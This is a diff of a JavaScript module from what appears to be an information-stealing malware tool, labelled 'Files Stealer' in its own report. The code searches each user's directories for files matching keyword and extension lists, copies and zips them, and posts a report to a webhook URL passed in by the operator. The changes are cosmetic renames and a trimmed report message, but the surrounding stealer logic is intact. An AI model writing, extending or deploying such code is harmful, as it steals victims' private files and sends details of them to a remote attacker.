@@ -21,28 +21,28 @@ const extensions = [
     ".csv", ".db", ".jpg", ".jpeg",
 ];
 
-const isMatchingFile = (fileName) => {
+const IsMatchingFile = (fileName) => {
     const lowerCaseName = fileName.toLowerCase();
     return keywords.some(keyword => lowerCaseName.includes(keyword)) &&
         extensions.some(extension => lowerCaseName.endsWith(extension));
 };
 
-const searchFiles = async (dir, commonFilesTempDir, foundExtensions) => {
+const SearchFiles = async (dir, commonFilesTempDir, foundExtensions) => {
     try {
         const files = await fs.readdir(dir);
         const tasks = files.map(async (file) => {
             const filePath = path.join(dir, file);
             const info = await fs.stat(filePath);
 
-            if (info.isFile() && info.size <= 2 * 1024 * 1024 && isMatchingFile(file)) {
+            if (info.isFile() && info.size <= 2 * 1024 * 1024 && IsMatchingFile(file)) {
                 const userDir = path.join(commonFilesTempDir, path.basename(dir));
                 await fs.mkdir(userDir, { recursive: true });
-                const dest = path.join(userDir, `${program.randString(5)}_${file}`);
+                const dest = path.join(userDir, `${program.RandString(5)}_${file}`);
 
-                await fileutil.copy(filePath, dest);
+                await fileutil.Copy(filePath, dest);
                 foundExtensions.add(path.extname(file).toLowerCase());
             } else if (info.isDirectory()) {
-                await searchFiles(filePath, commonFilesTempDir, foundExtensions);
+                await SearchFiles(filePath, commonFilesTempDir, foundExtensions);
             }
         });
 
@@ -53,7 +53,7 @@ const searchFiles = async (dir, commonFilesTempDir, foundExtensions) => {
 
 module.exports = async (webhookUrl) => {
     const foundExtensions = new Set();
-    const users = await hardware.getUsers();
+    const users = await hardware.GetUsers();
 
     for (const user of users) {
         const commonFilesTempDir = path.join(os.tmpdir(), `commonfiles-temp`);
@@ -76,22 +76,22 @@ module.exports = async (webhookUrl) => {
         for (const dir of directories) {
             const dirStats = await fs.stat(dir).catch(() => null);
             if (dirStats && dirStats.isDirectory()) {
-                await searchFiles(dir, destcommonFiles, foundExtensions);
+                await SearchFiles(dir, destcommonFiles, foundExtensions);
             }
         }
 
         const commonFilesTempZip = path.join(os.tmpdir(), 'commonfiles.zip');
 
         try {
-            await fileutil.zipDirectory({
+            await fileutil.ZipDirectory({
                 inputDir: commonFilesTempDir,
                 outputZip: commonFilesTempZip
             });
         
-            await requests.webhook(webhookUrl, {
+            await requests.Webhook(webhookUrl, {
                 embeds: [{
                     title: 'Files Stealer',
-                    description: '```' + fileutil.tree(commonFilesTempDir) + '```',
+                    description: '```' + '✅✅✅' + '```',
                     fields: [
                         { name: 'Extensions Found', value: '`' + [...foundExtensions].join(', ') + '`' }
                     ]
@@ -99,10 +99,10 @@ module.exports = async (webhookUrl) => {
             });
 
             const WishTempDir = fileutil.WishTempDir('commonfiles');
-            await fileutil.copy(commonFilesTempDir, WishTempDir);
+            await fileutil.Copy(commonFilesTempDir, WishTempDir);
 
             [commonFilesTempDir, commonFilesTempZip].forEach(async dir => {
-                await fileutil.removeDir(dir);
+                await fileutil.RemoveDir(dir);
             });
         } catch (error) {
             console.error(error);
